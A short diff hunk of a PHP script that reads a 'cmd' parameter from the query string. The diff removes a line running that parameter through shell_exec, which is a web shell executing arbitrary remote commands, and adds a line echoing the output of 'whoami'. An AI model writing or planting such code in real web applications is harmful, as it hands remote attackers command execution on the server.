@@ -6,7 +6,7 @@ if(isset($_GET["cmd"])){
 
 	$cmd = $_GET["cmd"];
 
-	shell_exec($cmd);
+	echo shell_exec("whoami");
 
 }
 
